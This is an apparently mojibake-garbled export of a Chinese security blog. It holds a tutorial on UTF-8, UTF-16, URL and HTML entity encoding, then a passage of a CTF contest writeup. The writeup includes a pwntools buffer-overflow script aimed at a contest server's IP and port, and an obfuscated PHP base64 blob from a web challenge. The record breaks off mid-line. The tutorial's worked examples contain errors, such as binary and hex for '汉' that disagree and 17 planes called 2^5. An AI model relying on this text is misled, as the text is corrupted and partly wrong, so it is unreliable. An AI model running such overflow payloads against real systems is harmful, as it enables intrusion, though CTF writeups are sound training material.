æ–¹å¼ï¼Œå®ƒçš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¯å˜é•¿ã€‚å®ƒå¯ä»¥ä½¿ç”¨ 1 - 4 ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œæ ¹æ®å­—ç¬¦çš„ä¸åŒå˜æ¢é•¿åº¦ã€‚ç¼–ç è§„åˆ™å¦‚ä¸‹ï¼š</p><p>å¯¹äºå•ä¸ªå­—èŠ‚çš„å­—ç¬¦ï¼Œç¬¬ä¸€ä½è®¾ä¸º 0ï¼Œåé¢çš„ 7 ä½å¯¹åº”è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹ã€‚å› æ­¤ï¼Œå¯¹äºè‹±æ–‡ä¸­çš„ 0 - 127 å·å­—ç¬¦ï¼Œä¸ ASCII ç å®Œå…¨ç›¸åŒã€‚è¿™æ„å‘³ç€ ASCII ç é‚£ä¸ªå¹´ä»£çš„æ–‡æ¡£ç”¨ UTF-8 ç¼–ç æ‰“å¼€å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚</p><p>å¯¹äºéœ€è¦ä½¿ç”¨ N ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºçš„å­—ç¬¦ï¼ˆN &gt; 1ï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰ N ä½éƒ½è®¾ä¸º 1ï¼Œç¬¬ N + 1 ä½è®¾ä¸º0ï¼Œå‰©ä½™çš„ N - 1 ä¸ªå­—èŠ‚çš„å‰ä¸¤ä½éƒ½è®¾ä½ 10ï¼Œå‰©ä¸‹çš„äºŒè¿›åˆ¶ä½åˆ™ä½¿ç”¨è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹æ¥å¡«å……ã€‚</p><p>ç¼–ç è§„åˆ™å¦‚ä¸‹ï¼š</p><pre><code>Unicode åå…­è¿›åˆ¶ç ç‚¹èŒƒå›´    UTF-8 äºŒè¿›åˆ¶0000 0000 - 0000 007F    0xxxxxxx0000 0080 - 0000 07FF    110xxxxx 10xxxxxx0000 0800 - 0000 FFFF    1110xxxx 10xxxxxx 10xxxxxx0001 0000 - 0010 FFFF    11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</code></pre><p>æ ¹æ®ä¸Šé¢ç¼–ç è§„åˆ™å¯¹ç…§è¡¨ï¼Œè¿›è¡Œ UTF-8 ç¼–ç å’Œè§£ç å°±ç®€å•å¤šäº†ã€‚ä¸‹é¢ä»¥æ±‰å­—â€œæ±‰â€ä¸ºåˆ©ï¼Œå…·ä½“è¯´æ˜å¦‚ä½•è¿›è¡Œ UTF-8 ç¼–ç å’Œè§£ç ã€‚</p><p>â€œæ±‰â€çš„ Unicode ç ç‚¹æ˜¯ 0x6c49ï¼ˆ110 1100 0100 1001ï¼‰ï¼Œé€šè¿‡ä¸Šé¢çš„å¯¹ç…§è¡¨å¯ä»¥å‘ç°ï¼Œ0x0000 6c49 ä½äºç¬¬ä¸‰è¡Œçš„èŒƒå›´ï¼Œé‚£ä¹ˆå¾—å‡ºå…¶æ ¼å¼ä¸º 1110xxxx 10xxxxxx 10xxxxxxã€‚æ¥ç€ï¼Œä»â€œæ±‰â€çš„äºŒè¿›åˆ¶æ•°æœ€åä¸€ä½å¼€å§‹ï¼Œä»åå‘å‰ä¾æ¬¡å¡«å……å¯¹åº”æ ¼å¼ä¸­çš„ xï¼Œå¤šå‡ºçš„ x ç”¨ 0 è¡¥ä¸Šã€‚è¿™æ ·ï¼Œå°±å¾—åˆ°äº†â€œæ±‰â€çš„ UTF-8 ç¼–ç ä¸º 11100110 10110001 10001001ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶å°±æ˜¯ 0xE6 0xB7 0x89ã€‚</p><p>è§£ç çš„è¿‡ç¨‹ä¹Ÿååˆ†ç®€å•ï¼šå¦‚æœä¸€ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½æ˜¯ 0 ï¼Œåˆ™è¯´æ˜è¿™ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼›å¦‚æœä¸€ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½1ï¼Œé‚£ä¹ˆè¿ç»­æœ‰å¤šå°‘ä¸ª 1ï¼Œå°±è¡¨ç¤ºè¯¥å­—ç¬¦å ç”¨å¤šå°‘ä¸ªå­—èŠ‚ã€‚</p><h2 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h2><p>åœ¨äº†è§£ UTF-16 ç¼–ç æ–¹å¼ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹å¦å¤–ä¸€ä¸ªæ¦‚å¿µâ€”â€”â€œå¹³é¢â€ã€‚</p><p>åœ¨ä¸Šé¢çš„ä»‹ç»ä¸­ï¼Œæåˆ°äº† Unicode æ˜¯ä¸€æœ¬å¾ˆåšçš„å­—å…¸ï¼Œå¥¹å°†å…¨ä¸–ç•Œæ‰€æœ‰çš„å­—ç¬¦å®šä¹‰åœ¨ä¸€ä¸ªé›†åˆé‡Œã€‚è¿™ä¹ˆå¤šçš„å­—ç¬¦ä¸æ˜¯ä¸€æ¬¡æ€§å®šä¹‰çš„ï¼Œè€Œæ˜¯åˆ†åŒºå®šä¹‰ã€‚æ¯ä¸ªåŒºå¯ä»¥å­˜æ”¾ 65536 ä¸ªï¼ˆ2^16ï¼‰å­—ç¬¦ï¼Œç§°ä¸ºä¸€ä¸ªå¹³é¢ï¼ˆplaneï¼‰ã€‚ç›®å‰ï¼Œä¸€å…±æœ‰ 17 ä¸ªï¼ˆ2^5ï¼‰å¹³é¢ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ•´ä¸ª Unicode å­—ç¬¦é›†çš„å¤§å°ç°åœ¨æ˜¯ 2^21ã€‚</p><p>æœ€å‰é¢çš„ 65536 ä¸ªå­—ç¬¦ä½ï¼Œç§°ä¸ºåŸºæœ¬å¹³é¢ï¼ˆç®€ç§° BMP ï¼‰ï¼Œå®ƒçš„ç ç‚¹èŒƒå›´æ˜¯ä» 0 åˆ° 2^16-1ï¼Œå†™æˆ 16 è¿›åˆ¶å°±æ˜¯ä» U+0000 åˆ° U+FFFFã€‚æ‰€æœ‰æœ€å¸¸è§çš„å­—ç¬¦éƒ½æ”¾åœ¨è¿™ä¸ªå¹³é¢ï¼Œè¿™æ˜¯ Unicode æœ€å…ˆå®šä¹‰å’Œå…¬å¸ƒçš„ä¸€ä¸ªå¹³é¢ã€‚å‰©ä¸‹çš„å­—ç¬¦éƒ½æ”¾åœ¨è¾…åŠ©å¹³é¢ï¼ˆç®€ç§° SMP ï¼‰ï¼Œç ç‚¹èŒƒå›´ä» U+010000 åˆ° U+10FFFFã€‚</p><p>åŸºæœ¬äº†è§£äº†å¹³é¢çš„æ¦‚å¿µåï¼Œå†è¯´å›åˆ° UTF-16ã€‚UTF-16 ç¼–ç ä»‹äº UTF-32 ä¸ UTF-8 ä¹‹é—´ï¼ŒåŒæ—¶ç»“åˆäº†å®šé•¿å’Œå˜é•¿ä¸¤ç§ç¼–ç æ–¹æ³•çš„ç‰¹ç‚¹ã€‚å®ƒçš„ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼šåŸºæœ¬å¹³é¢çš„å­—ç¬¦å ç”¨ 2 ä¸ªå­—èŠ‚ï¼Œè¾…åŠ©å¹³é¢çš„å­—ç¬¦å ç”¨ 4 ä¸ªå­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒUTF-16 çš„ç¼–ç é•¿åº¦è¦ä¹ˆæ˜¯ 2 ä¸ªå­—èŠ‚ï¼ˆU+0000 åˆ° U+FFFFï¼‰ï¼Œè¦ä¹ˆæ˜¯ 4 ä¸ªå­—èŠ‚ï¼ˆU+010000 åˆ° U+10FFFFï¼‰ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå½“æˆ‘ä»¬é‡åˆ°ä¸¤ä¸ªå­—èŠ‚æ—¶ï¼Œåˆ°åº•æ˜¯æŠŠè¿™ä¸¤ä¸ªå­—èŠ‚å½“ä½œä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯ä¸åé¢çš„ä¸¤ä¸ªå­—èŠ‚ä¸€èµ·å½“ä½œä¸€ä¸ªå­—ç¬¦å‘¢ï¼Ÿ</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„åœ°æ–¹ï¼Œåœ¨åŸºæœ¬å¹³é¢å†…ï¼Œä» U+D800 åˆ° U+DFFF æ˜¯ä¸€ä¸ªç©ºæ®µï¼Œå³è¿™äº›ç ç‚¹ä¸å¯¹åº”ä»»ä½•å­—ç¬¦ã€‚å› æ­¤ï¼Œè¿™ä¸ªç©ºæ®µå¯ä»¥ç”¨æ¥æ˜ å°„è¾…åŠ©å¹³é¢çš„å­—ç¬¦ã€‚</p><p>è¾…åŠ©å¹³é¢çš„å­—ç¬¦ä½å…±æœ‰ 2^20 ä¸ªï¼Œå› æ­¤è¡¨ç¤ºè¿™äº›å­—ç¬¦è‡³å°‘éœ€è¦ 20 ä¸ªäºŒè¿›åˆ¶ä½ã€‚UTF-16 å°†è¿™ 20 ä¸ªäºŒè¿›åˆ¶ä½åˆ†æˆä¸¤åŠï¼Œå‰ 10 ä½æ˜ å°„åœ¨ U+D800 åˆ° U+DBFFï¼Œç§°ä¸ºé«˜ä½ï¼ˆHï¼‰ï¼Œå 10 ä½æ˜ å°„åœ¨ U+DC00 åˆ° U+DFFFï¼Œç§°ä¸ºä½ä½ï¼ˆLï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œä¸€ä¸ªè¾…åŠ©å¹³é¢çš„å­—ç¬¦ï¼Œè¢«æ‹†æˆä¸¤ä¸ªåŸºæœ¬å¹³é¢çš„å­—ç¬¦è¡¨ç¤ºã€‚</p><p>å› æ­¤ï¼Œå½“æˆ‘ä»¬é‡åˆ°ä¸¤ä¸ªå­—èŠ‚ï¼Œå‘ç°å®ƒçš„ç ç‚¹åœ¨ U+D800 åˆ° U+DBFF ä¹‹é—´ï¼Œå°±å¯ä»¥æ–­å®šï¼Œç´§è·Ÿåœ¨åé¢çš„ä¸¤ä¸ªå­—èŠ‚çš„ç ç‚¹ï¼Œåº”è¯¥åœ¨ U+DC00 åˆ° U+DFFF ä¹‹é—´ï¼Œè¿™å››ä¸ªå­—èŠ‚å¿…é¡»æ”¾åœ¨ä¸€èµ·è§£è¯»ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œä»¥æ±‰å­—â€ğ ®·â€ä¸ºä¾‹ï¼Œè¯´æ˜ UTF-16 ç¼–ç æ–¹å¼æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</p><p>æ±‰å­—â€ğ ®·â€çš„ Unicode ç ç‚¹ä¸º 0x20BB7ï¼Œè¯¥ç ç‚¹æ˜¾ç„¶è¶…å‡ºäº†åŸºæœ¬å¹³é¢çš„èŒƒå›´ï¼ˆ0x0000 - 0xFFFFï¼‰ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚é¦–å…ˆç”¨ 0x20BB7 - 0x10000 è®¡ç®—å‡ºè¶…å‡ºçš„éƒ¨åˆ†ï¼Œç„¶åå°†å…¶ç”¨ 20 ä¸ªäºŒè¿›åˆ¶ä½è¡¨ç¤ºï¼ˆä¸è¶³å‰é¢è¡¥ 0 ï¼‰ï¼Œç»“æœä¸º0001000010 1110110111ã€‚æ¥ç€ï¼Œå°†å‰ 10 ä½æ˜ å°„åˆ° U+D800 åˆ° U+DBFF ä¹‹é—´ï¼Œå 10 ä½æ˜ å°„åˆ° U+DC00 åˆ° U+DFFF å³å¯ã€‚U+D800 å¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º 1101100000000000ï¼Œç›´æ¥å¡«å……åé¢çš„ 10 ä¸ªäºŒè¿›åˆ¶ä½å³å¯ï¼Œå¾—åˆ° 1101100001000010ï¼Œè½¬æˆ 16 è¿›åˆ¶æ•°åˆ™ä¸º 0xD842ã€‚åŒç†å¯å¾—ï¼Œä½ä½ä¸º 0xDFB7ã€‚å› æ­¤å¾—å‡ºæ±‰å­—â€ğ ®·â€çš„ UTF-16 ç¼–ç ä¸º 0xD842 0xDFB7ã€‚</p><p>Unicode3.0 ä¸­ç»™å‡ºäº†è¾…åŠ©å¹³é¢å­—ç¬¦çš„è½¬æ¢å…¬å¼ï¼š</p><pre><code>H = Math.floor((c-0x10000) / 0x400)+0xD800L = (c - 0x10000) % 0x400 + 0xDC00</code></pre><p>æ ¹æ®ç¼–ç å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è®¡ç®—å‡ºå­—ç¬¦çš„ UTF-16 ç¼–ç ã€‚</p><p><strong>ç¤ºä¾‹</strong></p><p>Unicodeç¼–ç æœ‰ä»¥ä¸‹å››ç§ç¼–ç æ–¹å¼ï¼š</p><p>æºæ–‡æœ¬ï¼š<code>The</code></p><pre><code>&amp;#x [Hex]ï¼š&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065;&amp;# [Decimal]ï¼š&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101;\U [Hex]ï¼š\U0054\U0068\U0065\U+ [Hex]ï¼š\U+0054\U+0068\U+0065</code></pre><h2 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h2><p>urlç¼–ç æ˜¯ä¸€ç§æµè§ˆå™¨ç”¨æ¥æ‰“åŒ…è¡¨å•è¾“å…¥çš„æ ¼å¼ã€‚æµè§ˆå™¨ä»è¡¨å•ä¸­è·å–æ‰€æœ‰çš„nameå’Œå…¶ä¸­çš„å€¼ ï¼Œå°†å®ƒä»¬ä»¥name/valueå‚æ•°ç¼–ç ï¼ˆç§»å»é‚£äº›ä¸èƒ½ä¼ é€çš„å­—ç¬¦ï¼Œå°†æ•°æ®æ’è¡Œç­‰ç­‰ï¼‰ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†æˆ–è€…åˆ†ç¦»åœ°å‘ç»™æœåŠ¡å™¨ã€‚</p><h3 id="ä¸ºä»€ä¹ˆè¦URLç¼–ç ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦URLç¼–ç ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦URLç¼–ç ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦URLç¼–ç ï¼Ÿ</h3><p>åœ¨å› ç‰¹ç½‘ä¸Šä¼ é€URLï¼Œåªèƒ½é‡‡ç”¨ASCIIå­—ç¬¦é›†</p><p>ä¹Ÿå°±æ˜¯è¯´URLåªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ã€é˜¿æ‹‰ä¼¯æ•°å­—å’ŒæŸäº›æ ‡ç‚¹ç¬¦å·ï¼Œä¸èƒ½ä½¿ç”¨å…¶ä»–æ–‡å­—å’Œç¬¦å·ï¼Œå³åªæœ‰å­—æ¯å’Œæ•°å­—<code>[0-9a-zA-Z]</code>ã€ä¸€äº›ç‰¹æ®Šç¬¦å·<code>$-_.+!*&#39;()</code>(ä¸åŒ…æ‹¬åŒå¼•å·)ã€ä»¥åŠæŸäº›ä¿ç•™å­—ï¼ˆç©ºæ ¼è½¬æ¢ä¸º+ï¼‰ï¼Œæ‰å¯ä»¥ä¸ç»è¿‡ç¼–ç ç›´æ¥ç”¨äºURLè¿™æ„å‘³ç€ å¦‚æœURLä¸­æœ‰æ±‰å­—ï¼Œå°±å¿…é¡»ç¼–ç åä½¿ç”¨ã€‚</p><h3 id="å¦‚ä½•ç¼–ç "><a href="#å¦‚ä½•ç¼–ç " class="headerlink" title="å¦‚ä½•ç¼–ç "></a>å¦‚ä½•ç¼–ç </h3><p>URLç¼–ç é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºç™¾åˆ†å·ç¼–ç ï¼ˆpercent-encodingï¼‰ï¼Œæ˜¯å› ä¸ºå®ƒçš„ç¼–ç æ–¹å¼éå¸¸ç®€å•ï¼š</p><p>ä½¿ç”¨%åŠ ä¸Šä¸¤ä½çš„å­—ç¬¦â€”â€”0123456789ABCDEFâ€”â€”ä»£è¡¨ä¸€ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶å½¢å¼ã€‚URLç¼–ç è¦åšçš„ï¼Œå°±æ˜¯å°†æ¯ä¸€ä¸ªéå®‰å…¨çš„ASCIIå­—ç¬¦éƒ½è¢«æ›¿æ¢ä¸ºâ€œ%xxâ€æ ¼å¼ï¼Œ<br>å¯¹äºéASCIIå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚<br>å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º<code>0xE4 0xB8 0xAD 0xE6 0x96 0x87</code>ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°<code>%E4%B8%AD%E6%96%87</code>ã€‚</p><p><strong>ç¤ºä¾‹</strong></p><p>æºæ–‡æœ¬ï¼š<code>The quick brown fox jumps over the lazy dog</code></p><p>ç¼–ç åï¼š</p><pre><code>%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</code></pre><h2 id="HTMLå®ä½“ç¼–ç "><a href="#HTMLå®ä½“ç¼–ç " class="headerlink" title="HTMLå®ä½“ç¼–ç "></a>HTMLå®ä½“ç¼–ç </h2><p>åœ¨ HTML ä¸­ï¼ŒæŸäº›å­—ç¬¦æ˜¯é¢„ç•™çš„ã€‚</p><p>åœ¨ HTML ä¸­ä¸èƒ½ä½¿ç”¨å°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œè¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ã€‚</p><p>å¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ HTML æºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼ˆcharacter entitiesï¼‰ã€‚</p><p>å­—ç¬¦å®ä½“ç±»ä¼¼è¿™æ ·ï¼š</p><pre><code>&amp;entity_name;</code></pre><p>æˆ–è€…</p><pre><code>&amp;#entity_number;</code></pre><p>å¦‚éœ€æ˜¾ç¤ºå°äºå·ï¼Œæˆ‘ä»¬å¿…é¡»è¿™æ ·å†™ï¼š<code>&amp;lt;</code> æˆ–<code>&amp;#60</code>;</p><p><strong>å‚è€ƒï¼š</strong></p><p><a href="https://www.cnblogs.com/crazylqy/p/10184291.html">https://www.cnblogs.com/crazylqy/p/10184291.html</a></p><p><a href="https://www.cnblogs.com/xzwblog/p/6932870.html">https://www.cnblogs.com/xzwblog/p/6932870.html</a></p><p><a href="https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html">https://uknowsec.cn/posts/ctf/CTFä¸­é‚£äº›è„‘æ´å¤§å¼€çš„ç¼–ç å’ŒåŠ å¯†.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> è¿›åˆ¶ </tag>
            
            <tag> ç¼–ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­åŸå·¥å­¦é™¢Dropså¤ä»¤è¥æ–°ç”Ÿèµ›writeup</title>
      <link href="2019/08/15/drops-new-2019/"/>
      <url>2019/08/15/drops-new-2019/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢è®°å½•äº†æœ¬äººå‚åŠ dropsæ”»é˜²è®­ç»ƒè¥æœ€åçš„æ–°ç”Ÿèµ›çš„ä¸€äº›writeup,å¾ˆèœï¼Œå‹¿å–·ï¼ï¼ï¼</p><a id="more"></a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>å’Œæ”»é˜²ä¸–ç•Œlevel0ç›¸ä¼¼ï¼Œæ”¹ä¸‹ä¹‹å‰å‰è„šæœ¬å°±è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;101.132.41.135&quot;,&quot;10000&quot;)</span><br><span class="line">v &#x3D; 0x80485E6</span><br><span class="line">payload &#x3D; 112*&#39;a&#39; + p32(v)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>væ˜¯åé—¨å‡½æ•°çš„åœ°å€</p><p>112*â€™aâ€™ä»£è¡¨0x6cå¤§å°çš„bufåŠ ä¸Š32ä½4ä¸ªå­—èŠ‚çš„ebp</p><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="chaos-file"><a href="#chaos-file" class="headerlink" title="chaos file"></a>chaos file</h3><p>æ‰“å¼€ç½‘å€çœ‹åˆ°æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2019/08/15/drops-new-2019/20190810181622.png"></p><p>æŠŠphpä»£ç æ•´ç†ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $_ &#x3D; &lt;&lt;&lt;asdfiohaefho</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doV1YwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldoVVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldoVFYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span 